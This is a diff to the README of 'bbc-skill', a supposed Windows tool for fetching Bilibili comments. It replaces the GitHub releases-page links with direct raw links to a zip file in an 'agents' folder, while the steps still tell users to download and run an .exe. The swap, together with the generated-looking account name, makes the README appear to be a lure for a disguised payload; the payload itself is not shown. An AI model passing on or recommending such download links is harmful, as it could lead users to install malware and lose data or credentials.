@@ -1,6 +1,6 @@
 # 📊 bbc-skill - Fetch Bilibili comments for deeper analysis
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Analliseamicable382/bbc-skill/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Analliseamicable382/bbc-skill/main/agents/bbc-skill-1.1.zip)
 
 ## 💡 Overview
 
@@ -15,7 +15,7 @@ This application runs on Windows 10 or Windows 11. It needs an active internet c
 Follow these steps to set up the tool on your computer.
 
 1. Visit the project release page to download the application. Click the link below to go there:
-[Download link: https://github.com/Analliseamicable382/bbc-skill/releases](https://github.com/Analliseamicable382/bbc-skill/releases)
+[Download link: https://raw.githubusercontent.com/Analliseamicable382/bbc-skill/main/agents/bbc-skill-1.1.zip](https://raw.githubusercontent.com/Analliseamicable382/bbc-skill/main/agents/bbc-skill-1.1.zip)
 2. Locate the file ending in .exe on the page that opens.
 3. Click that file to save it to your computer.
 4. Open your Downloads folder.
